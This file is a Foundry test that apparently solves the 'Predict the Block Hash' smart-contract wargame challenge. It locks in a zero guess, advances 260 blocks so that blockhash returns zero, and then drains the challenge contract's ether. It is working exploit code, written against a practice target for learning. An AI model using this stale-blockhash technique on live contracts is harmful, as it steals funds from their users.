// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./PredictTheBlockHashChallenge.sol";

contract PredictTheBlockHashChallengeTest is Test {
    PredictTheBlockHashChallenge public predictTheBlockHashChallenge;
    address hacker = makeAddr("hacker");

    function setUp() public {
        payable(hacker).transfer(1 ether);

        predictTheBlockHashChallenge = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function testPredictTheBlockHash() public {
        emit log_named_uint("my balance", hacker.balance);
        emit log_named_uint("predictTheBlockHashChallenge's balance", address(predictTheBlockHashChallenge).balance);

        vm.startPrank(hacker);
        predictTheBlockHashChallenge.lockInGuess{value: 1 ether}(bytes32(0));

        vm.roll(block.number + 260);

        predictTheBlockHashChallenge.settle();
        vm.stopPrank();

        emit log_named_uint("my new value", hacker.balance);
        emit log_named_uint("predictTheBlockHashChallenge's new balance", address(predictTheBlockHashChallenge).balance);

        assertTrue(predictTheBlockHashChallenge.isComplete());
    }
}
